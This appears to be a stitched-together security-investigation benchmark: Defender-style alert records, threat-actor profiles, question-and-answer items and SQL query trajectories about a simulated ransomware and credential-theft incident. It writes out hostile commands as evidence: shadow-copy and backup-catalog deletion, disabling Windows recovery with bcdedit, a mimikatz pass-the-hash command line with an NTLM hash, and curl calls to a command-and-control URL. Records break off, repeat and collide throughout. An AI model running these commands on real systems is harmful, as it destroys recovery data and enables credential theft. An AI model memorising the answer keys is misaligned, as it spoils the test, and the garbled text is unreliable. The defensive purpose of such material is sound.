Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', ('Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', question.context: The security incident involves suspicious WMI process creation, which is a common tactic used by malware to break process trees and infect a machine. We observed several processes on the `vnevado-win10s` host, including suspicious commands such as `vssblatemp.exe delete shadows /all`, `bcdedit /set recoveryenabled no`, `curl http://vectorsandarrows.com`, and `powershell -file c:\scripts\get-userprttoken.ps1`. These commands were executed around the same time frame, raising concerns about potential malicious activities.

question.context: A security incident involving a possible attempt to access Primary Refresh Token (PRT) was detected. The file `browsercore.exe` was launched with the command line `browsercore.exe` on process ID 1640 at 2024-06-20T09:32:12.1031042Z. The PRT is a key artifact of Azure AD authentication used to enable single sign-on (SSO) across devices. Attackers might attempt to access this token to move laterally within the organization or perform credential theft. For more information, check the Midnight Blizzard credential attacks Threat Analytics report.

('e34d562e-ef12-4c4e-9bc0-7c6ae357c015', '2024-06-20 09:40:00.218287+00:00', 'Possible attempt to access Primary Refresh Token (PRT)', 'Possible attempt to access Primary Refresh Token (PRT)', "Possible attempt to access Primary Refresh Token (PRT) has been detected. A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

('e34d562e-ef12-4c4e-9bc0-7c6ae357c015', '2024-06-20 09:44:53.846994+00:00', 'Possible attempt to access Primary Refresh Token (PRT)', 'Possible attempt to access Primary Refresh Token (PRT)', "Possible attempt to access Primary Refresh Token (PRT) has been detected. A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

This may deny access to available backups and recovery options.

('System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', '{"MicrosoftDefenderAtp.Category":"Ransomware","MicrosoftDefenderAtp.InvestigationId":null,"MicrosoftDefenderAtp.InvestigationState":"UnsupportedAlertType","LastUpdated":"06/20/2024 09:38:35","IncidentId":"107","DetectionSource":"WindowsDefenderAtp","AssignedTo":"Defender Experts","Determination":null,"Classification":null,"Action":"•	Contact your incident response team. [('Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', question.context: A serious security incident involving the Mimikatz credential theft tool was detected on a device. Mimikatz is known for harvesting plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. An attacker might use this tool to obtain credentials to log into this or other devices on the network by impersonating a valid user. The tool was executed with several different command lines indicating privilege escalation and credential theft attempts.
question.question: What was the command line of the process detected with the known credential theft tool execution?
solution: The attacker launched `mimikatz.exe` with the command line `privilege::debug sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:..\notepad.exe \vnevado-jump cmd.exe` at `2024-06-20t09:05:15.5627318z`, with Process ID `6600`.
A malicious credential theft tool execution was detected with the command line `conhost.exe 0xffffffff -forcev1` at `2024-06-20t08:59:42.8455252z`, with Process ID `7948`.

question.context: A security incident involving the Manatee Tempest activity group was detected. This group is known for using drive-by downloads and other methods to gain initial access, followed by using malware tools for lateral movement. The incident started with a suspicious activity involving a URL `http://vectorsandarrows.com`, accessed from host `vnevado-win10r` with IP address `198.43.121.209` via a curl command. The ProcessId__CreatedTimeUtc__CommandLine is `1332__2024-06-20t09:10:52.7298237z__curl http://vectorsandarrows.com`.
question.question: What is the host name of the device where 'CommandAndControl' malware was detected during lateral movement?
solution: Manatee Tempest, a Russia-based cybercriminal group, was involved in the use of access broker Mustard Tempest to facilitate infections and lateral movement using BLISTER loader and Cobalt Strike beacons on various networks. The group used domain fronting for command-and-control of Cobalt Strike.
A suspicious account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was identified in the context of the Manatee Tempest group activities.
The 'CommandAndControl' malware was detected on the host `vnevado-win10s`, indicating an attempt at lateral movement within the network.

('Manatee Tempest activity group', 'Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', question.context: An incident occurred involving the potential compromise of devices showing ransomware-like behavior. An IP address associated with this is `99.83.111.100`, and files such as `get-userprttoken.ps1`, `characterical.zip`, and `characterical.zip.lockbit` were detected. Additionally, there was an incident of system recovery setting tampering. The tampering might involve adversaries deleting or removing system data and turning off recovery features to prevent system restoration.
question.question: Can you identify the process command used that might have tampered with the system recovery settings?
solution: The device with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033` is potentially compromised and exhibiting ransomware-like behavior.

On 2024-06-20 at 09:29:40.8785892 UTC, the process vssblatemp.exe with Process ID `1900` was executed with the command line `vssblatemp.exe delete shadows /all` to tamper with system recovery settings by deleting volume shadow copies.

question.context: A security incident started with lateral movement detected from IP address `83.162.58.168`. The alert was flagged as 'Possible lateral movement' and indicated that an attacker might be trying to gather data or elevate privileges by moving across different devices. This alert was based on a Microsoft Defender for Endpoint alert. Shortly after, at 2024-07-04 22:35:03.652724+00:00, a 'Command and Control behavior' alert was triggered due to malware activities. This malware was active and necessitated precautionary measures. Finally, an alert flagged as 'Possible attempt to access Primary Refresh Token (PRT)' was observed, indicating an attempt to access Azure AD authentication resources which could facilitate lateral movement or credential theft.
question.question: What is the hostname of the device where a possible attempt to access Primary Refresh Token (PRT) was detected?
solution: There was possible lateral movement observed on another device associated with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`.
Command and control behavior related to malware was blocked, and the associated account name is `dp5hn`.
A possible attempt to access the Primary Refresh Token (PRT) was detected on the host `vnevado-win10s`.

question.context: A security incident was detected involving a possible attempt to access a Primary Refresh Token (PRT), which is an important artifact for Azure AD authentication. This event was associated with the process `browsercore.exe` running on the host `vnevado-win11t` with the AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`. PRTs enable Single Sign-On (SSO) and, if compromised, can allow an attacker to move laterally or perform credential theft.
question.question: In this incident, potentially compromised assets are exhibiting ransomware-like behavior. Can you identify the name of the file that has been impacted by ransomware?
solution: There was a possible attempt to access a Primary Refresh Token (PRT) by the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
Potentially compromised assets exhibiting ransomware-like behavior were detected, involving a file named `unstreaming.xlsx.lockbit`.

question.context: A security incident related to the Manatee Tempest activity group was also identified. Manatee Tempest is known for using various methods such as drive-by download, including malvertising and FakeUpdates (SocGholish) infections, to obtain initial access, and they frequently use BLISTER loader to deliver Cobalt Strike beacons for lateral movement and ransomware deployment. The group also employs domain fronting for command-and-control channels.
question.question: Can you identify the malicious IP address associated with the Manatee Tempest group activities?

The cybercriminal group, Manatee Tempest, known for deploying ransomware and other malware, accessed using IP address `198.43.121.209`.

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: As part of the process leading to the discovery of an unknown malware, we found that components such as `cmd.exe`, `mimikatz.exe`, and `notepad.exe` were executed to conduct unwanted malicious activities. While the investigation revealed that an alert was raised due to the detection of this malware, the machine should still be thoroughly examined to rule out any possible infection.
question.question: Relating to this incident, a possible attempt to access the Primary Refresh Token (PRT) was detected. Can you identify the file name of the process involved in this attempt?
solution: An unknown malware was detected with the IP address `107.224.99.179` and was active.
There was a possible attempt to access the Primary Refresh Token (PRT) via the process `browsercore.exe`.

question.context: A security incident related to the Manatee Tempest activity group has been detected. This actor, tracked by Microsoft and known to be a Russia-based cybercriminal group, has been active since June 2014 and is notorious for its Dridex banking trojan campaigns. The group partners with Mustard Tempest to facilitate access to target networks via methods such as drive-by downloads, malvertising, and FakeUpdates infections. They use a BLISTER loader to deploy Cobalt Strike beacons for lateral movement and ransomware deployment. Recently, on host identified by `vnevado-win10s` with the AadDeviceId `f5b847aa-8712-4bf6-b4f7-ed6cd89e1505`, a process with ProcessId `6460` was initiated to execute a command to curl a suspicious URL (`http://vectorsandarrows.com`).

There is an activity by the Manatee Tempest group targeting a host with AadDeviceId `e5799261-6720-4297-961e-bd9ca4275033`.

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: A security incident involving the deletion of all file snapshots and shadow copies via WMI or VSSAdmin, which is common during ransomware infection, was detected. The process `vssblatemp.exe` with process ID 1900 was used to perform the deletion. This incident might be part of a larger malicious campaign as described in the Activity Profile: Iranian MOIS operators opportunistically deploy limited-impact wiper in response to Israel-Hamas war.
question.question: Following this alert, we also detected malicious command and control behavior. Can you provide the URL associated with this command and control behavior?
solution: File backups were deleted on host `vnevado-win11u`, commonly associated with ransomware infection.
A command and control behavior originating from the URL `http://vectorsandarrows.com/` was blocked, indicating an active malware infection.

question.context: A 'CommandAndControl' malware was detected on the device `vnevado-win11u` during a security incident on July 4, 2024. This detection suggests an attempt to move laterally within the network. During this investigation, a process with ID 5572 was initiated by the user account `dp5hn`, executing the `curl http://vectorsandarrows.com` command.

Lateral movement detected using PSExec to IP address `99.83.111.100` at `2024-07-10 11:24:45.260113+00:00`.

Command and Control behavior blocked; malware communicating with URL `http://vectorsandarrows.com/` at `2024-07-04 22:35:03.652724+00:00`.

question.context: A suspicious WMI process creation was observed on the machine. Malware frequently uses WMI to spawn new processes, breaking process trees and further infecting a machine. This activity occurred at 2024-07-04 22:35:03.378778+00:00. During the same incident, there was a possible attempt to access Primary Refresh Token (PRT) detected. A PRT is a key artifact of Azure AD authentication and is a JSON Web Token (JWT) issued to enable single sign-on (SSO) across applications used on devices such as Windows 10 and later versions, iOS, and Android. Attackers might attempt to access this token to move laterally or perform credential theft.
question.question: The answer points to browsercore.exe running at the specified time. This should be further scrutinized to confirm the activity related to PRT access attempt mentioned.

There was a possible attempt to access the Primary Refresh Token (PRT) through the process `browsercore.exe`, which was executed with Process ID `7036` at `2024-06-20t09:29:49.304018z`.

question.context: A recent security alert flagged a possible attempt to access Primary Refresh Token (PRT) on host `vnevado-win10r`, where the process `browsercore.exe` was involved. This scenario is often associated with attackers trying to move laterally within the organization or perform credential theft as PRT is a key artifact of Azure AD authentication.
question.question: What is the file name of the process involved in the suspicious WMI process creation observed on the machine after the attempt to access PRT?
solution: There was a detected attempt to access the Primary Refresh Token (PRT) associated with the Azure AD user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
A suspicious WMI process `vssblatemp.exe` was created on the machine, indicating potential malware activity.

trajectory.action:
SELECT dp.FileName 
FROM DeviceProcessEvents dp
WHERE dp.DeviceName = 'vnevado-win10r'
  AND dp.ProcessCreationTime > (
      SELECT MIN(ProcessCreationTime) 
      FROM DeviceProcessEvents 
      WHERE DeviceName = 'vnevado-win10r'
        AND FileName LIKE '%browsercore.exe%'
        AND (AdditionalFields LIKE '%PRT%' OR ProcessCommandLine LIKE '%PRT%')
  )
  AND (dp.InitiatingProcessCommandLine LIKE '%WMI%' OR dp.ProcessCommandLine LIKE '%WMI%')
ORDER BY dp.ProcessCreationTime ASC
LIMIT 1

SELECT ProcessCreationTime, FileName, AdditionalFields, ProcessCommandLine 
FROM DeviceProcessEvents 
WHERE DeviceName = 'vnevado-win10r' 
  AND FileName LIKE '%browsercore.exe%' 
  AND (AdditionalFields LIKE '%PRT%' OR ProcessCommandLine LIKE '%PRT%')
ORDER BY ProcessCreationTime ASC 
LIMIT 1

SELECT * FROM DeviceEvents WHERE DeviceName = 'vnevado-win10r' AND (FileName LIKE '%browsercore.exe%' OR AdditionalFields LIKE '%browsercore.exe%') AND (AdditionalFields LIKE '%PRT%' OR FileName LIKE '%PRT%') LIMIT 5

FROM DeviceProcessEvents 
WHERE DeviceName = 'vnevado-win10r' 
  AND (ProcessCommandLine LIKE '%WMI%' OR ProcessCommandLine LIKE '%wmic%' OR InitiatingProcessCommandLine LIKE '%WMI%' OR InitiatingProcessCommandLine LIKE '%wmic%')
ORDER BY ProcessCreationTime ASC
LIMIT 5

question.context: As part of a Ransomware infection observed in our organization, file backups were deleted via WMI or VSSAdmin on the host `vnevado-win10r`. The process involved was identified with ProcessId__CreatedTimeUtc__CommandLine `7236__2024-06-20t09:10:51.2193152z__vssblatemp.exe delete shadows /all`. Further investigation identified that system recovery setting tampering was observed on the same host, where adversaries might be attempting to delete or remove built-in operating systems data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.
question.question: During the system recovery setting tampering, what process and command line was used to disable automatic Windows recovery features?
question.answer: Process Id: 4828, Command Line: `bcdedit /set recoveryenabled no`
solution: An attack was detected where file backups were deleted via `vssblatemp.exe`.

System recovery settings were tampered with using the process `bcdedit.exe` which was launched with the command line `bcdedit /set recoveryenabled no` at `2024-06-20t09:31:59.6743318z` with Process ID `4828`.

question.context: A suspicious and anomalous behavior was observed involving a user on device `vnevado-win11t`. This behavior suggested a potential compromise and a series of unusual activities might indicate that this device is involved in a possible human-operated attack by an advanced threat actor. During this investigation, an alert indicating activity from a Russia-based cybercriminal group, Manatee Tempest, was raised. Manatee Tempest is known for their partnership with Mustard Tempest, and they use techniques like drive-by download, malvertising, and FakeUpdates to gain initial access. They proceed with BLISTER loader to deliver Cobalt Strike for lateral movement and ransomware deployment, often using domain fronting for command-and-control.
question.question: What is the URL associated with the activity from Manatee Tempest?
solution: The user account `dp5hn` has exhibited suspicious and anomalous behavior on their device.
The URL `vectorsandarrows.com` is associated with the cybercriminal group Manatee Tempest, which uses drive-by downloads and other methods to gain access to target networks.

trajectory.action:
SELECT a.alert_id, ae.entity_value AS url
FROM alerts a
JOIN alert_entities ae ON a.alert_id = ae.alert_id
WHERE a.message LIKE '%Manatee Tempest%' 
  AND ae.entity_type = 'URL'
LIMIT 1

question.context: A security incident involving ransomware-like behavior impacting several devices has been observed. Initial detection included the use of PsExec to launch a command on a remote device, suggesting lateral movement using this tool. This was followed by suspicious activities leading to compromised assets exhibiting ransomware-like behavior. The attacker might be using the specified user account, IP, or device to infect multiple devices with ransomware. Automated remediation actions were considered to address the threat.
question.question: What is the name of the file that is associated with the ransomware-like behavior?
solution: An attacker used the account `tgs2z` to launch a command on a remote device via PsExec.
There was a lateral movement to the jump server with IP address `99.83.111.100` using PsExec.
A file named `ponceau.7z` is associated with ransomware-like behavior, indicating potentially compromised assets.

question.context: Start Alert: File backups were deleted, performed by `vssblatemp.exe` with Process ID 1900 and command line `vssblatemp.exe delete shadows /all`. The incident also involves a blocked Command and Control behavior alert. The blocked action is related to active malware, which can receive remote commands to conduct cyber attacks.
question.question: What is the URL involved in the Command and Control behavior that was blocked?
solution: All file snapshots and shadow copies have been deleted via WMI or VSSAdmin by the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
Command and Control (C2) behavior was blocked from the URL `http://vectorsandarrows.com/`.

('System recovery setting tampering', 'System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', '{"MicrosoftDefenderAtp.Category":"Ransomware","MicrosoftDefenderAtp.InvestigationId":null,"MicrosoftDefenderAtp.InvestigationState":"UnsupportedAlertType","LastUpdated":"06/20/2024 09:38:35","IncidentId":"107","DetectionSource":"WindowsDefenderAtp","AssignedTo":"Defender Experts","Determination":null,"Classification":null,"Action":"•	Contact your incident response team. Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
